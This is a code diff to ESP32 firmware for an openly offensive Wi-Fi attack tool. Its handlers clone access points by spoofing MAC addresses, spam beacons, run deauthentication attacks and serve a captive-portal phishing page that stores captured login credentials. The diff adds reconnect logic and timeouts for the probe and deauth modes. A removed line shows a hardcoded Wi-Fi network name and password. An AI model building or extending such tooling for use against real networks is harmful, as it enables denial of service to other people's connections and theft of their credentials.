@@ -20,12 +20,18 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
 
 WebServer server(80);
 
+// -- Wi-Fi Credentials --
+const char *HOME_SSID = ":)";
+const char *HOME_PASS = "0000000000";
+
 // -- State Flags --
 bool isProbing = false;
 bool isGhostMode = false;
 bool isBeaconSpamming = false;
 bool isDeauthing = false;
 bool isCaptivePortalActive = false;
+unsigned long probeStartTime = 0;
+unsigned long deauthStartTime = 0;
 
 // -- Captive Portal Data --
 struct Credential {
@@ -402,6 +408,10 @@ void handleScan() {
 void handleSpoofStart() {
   if (server.hasArg("ssid") && server.hasArg("bssid") &&
       server.hasArg("channel")) {
+    server.send(200, "text/plain", "Super Clone Active");
+    server.client().flush();
+    delay(50);
+
     String targetSsid = server.arg("ssid");
     int targetCh = server.arg("channel").toInt();
     uint8_t mac[6];
@@ -412,17 +422,19 @@ void handleSpoofStart() {
     WiFi.softAPdisconnect(true);
     esp_wifi_set_mac(WIFI_IF_AP, mac);
     WiFi.softAP(targetSsid.c_str(), NULL, targetCh);
-
-    server.send(200, "text/plain", "Super Clone Active");
   } else {
     server.send(400, "text/plain", "Missing args");
   }
 }
 
 void handleSpoofStop() {
+  server.send(200, "text/plain", "AP Stopped");
+  server.client().flush();
+  delay(50);
+
   Serial.println("\n[Spoofer] Stopping SoftAP...");
   WiFi.softAPdisconnect(true);
-  server.send(200, "text/plain", "AP Stopped");
+  WiFi.begin(HOME_SSID, HOME_PASS);
 }
 
 void handleProbeStart() {
@@ -434,13 +446,21 @@ void handleProbeStart() {
                   server.arg("bssid").c_str(), ch);
     detectedClients.clear();
     isProbing = true;
+    probeStartTime = millis();
+
+    server.send(200, "text/plain", "Probing");
+    server.client().flush();
+    delay(50);
+
+    // Disable auto-reconnect and drop connection to tune radio properly
+    WiFi.setAutoReconnect(false);
+    WiFi.disconnect();
+    delay(100);
 
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous(true);
-
-    server.send(200, "text/plain", "Probing");
   } else {
     server.send(400, "text/plain", "Missing args");
   }
@@ -458,10 +478,13 @@ void handleProbeResults() {
 }
 
 void handleProbeStop() {
-  Serial.println("\n[Prober] Stopping...");
+  Serial.println("\n[Prober] Stopping & Reconnecting...");
   isProbing = false;
   if (!isGhostMode)
     esp_wifi_set_promiscuous(false);
+
+  WiFi.setAutoReconnect(true);
+  WiFi.begin(HOME_SSID, HOME_PASS);
   server.send(200, "text/plain", "Stopped");
 }
 
@@ -470,6 +493,10 @@ void handleSpamAction() {
     server.send(400, "text/plain", "Missing args");
     return;
   }
+
+  server.send(200, "text/plain", "OK");
+  server.client().flush();
+  delay(50);
 
   String type = server.arg("type");
   bool state = (server.arg("state") == "on");
@@ -500,8 +527,6 @@ void handleSpamAction() {
   if (state && spamTask == NULL && (isBeaconSpamming || isGhostMode)) {
     xTaskCreate(spam_task_loop, "spam", 4096, NULL, 5, &spamTask);
   }
-
-  server.send(200, "text/plain", "OK");
 }
 
 void handleGhostResults() {
@@ -561,13 +586,26 @@ void handleDeauthStart() {
   }
 
   isDeauthing = true;
-  xTaskCreate(deauth_task_loop, "deauth", 4096, NULL, 5, &deauthTask);
+  deauthStartTime = millis();
+
   server.send(200, "text/plain", "Deauth started");
+  server.client().flush();
+  delay(50);
+
+  // Disable auto-reconnect and drop connection for offline attack
+  WiFi.setAutoReconnect(false);
+  WiFi.disconnect();
+  delay(100);
+
+  xTaskCreate(deauth_task_loop, "deauth", 4096, NULL, 5, &deauthTask);
 }
 
 void handleDeauthStop() {
-  Serial.println("\n[Deauth] Stop requested.");
+  Serial.println("\n[Deauth] Stop requested. Reconnecting...");
   isDeauthing = false;
+  delay(100); // Allow task to exit
+  WiFi.setAutoReconnect(true);
+  WiFi.begin(HOME_SSID, HOME_PASS);
   server.send(200, "text/plain", "Deauth stopped");
 }
 
@@ -587,6 +625,10 @@ void handlePhishingStart() {
     return;
   }
 
+  server.send(200, "text/plain", "Phishing Started");
+  server.client().flush();
+  delay(50);
+
   String targetSsid = server.arg("ssid");
   Serial.printf("\n[Phishing] Starting Captive Portal AP: '%s'\n",
                 targetSsid.c_str());
@@ -599,16 +641,18 @@ void handlePhishingStart() {
 
   isCaptivePortalActive = true;
   capturedCredentials.clear();
-
-  server.send(200, "text/plain", "Phishing Started");
 }
 
 void handlePhishingStop() {
+  server.send(200, "text/plain", "Phishing Stopped");
+  server.client().flush();
+  delay(50);
+
   Serial.println("\n[Phishing] Stopping Captive Portal...");
   isCaptivePortalActive = false;
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
-  server.send(200, "text/plain", "Phishing Stopped");
+  WiFi.begin(HOME_SSID, HOME_PASS);
 }
 
 void handleLoginGet() {
@@ -706,7 +750,7 @@ void setup() {
   esp_log_level_set("wifi", ESP_LOG_NONE);
 
   WiFi.mode(WIFI_AP_STA);
-  WiFi.begin("Siddhivinayak Hostel Floor 1", "123456789");
+  WiFi.begin(HOME_SSID, HOME_PASS);
 
   Serial.print("[WiFi] Connecting.");
   while (WiFi.status() != WL_CONNECTED) {
@@ -744,6 +788,7 @@ void setup() {
   server.on("/submit_login", HTTP_POST, handleSubmitLogin);
   server.on("/phishing_results", handlePhishingResults);
   server.on("/phishing_clear", handlePhishingClear);
+  server.on("/ping", []() { server.send(200, "text/plain", "pong"); });
   server.onNotFound(handleNotFound);
 
   server.begin();
@@ -754,5 +799,26 @@ void loop() {
   if (isCaptivePortalActive) {
     dnsServer.processNextRequest();
   }
+
+  // Enforce 10s timeout on offline probe
+  if (isProbing && (millis() - probeStartTime > 10000)) {
+    Serial.println(
+        "\n[Prober] 10s limit reached. Auto-stopping & Reconnecting...");
+    isProbing = false;
+    esp_wifi_set_promiscuous(false);
+    WiFi.setAutoReconnect(true);
+    WiFi.begin(HOME_SSID, HOME_PASS);
+  }
+
+  // Enforce 30s timeout on offline deauth
+  if (isDeauthing && (millis() - deauthStartTime > 30000)) {
+    Serial.println(
+        "\n[Deauth] 30s limit reached. Auto-stopping & Reconnecting...");
+    isDeauthing = false;
+    delay(100); // Allow task to exit
+    WiFi.setAutoReconnect(true);
+    WiFi.begin(HOME_SSID, HOME_PASS);
+  }
+
   server.handleClient();
 }
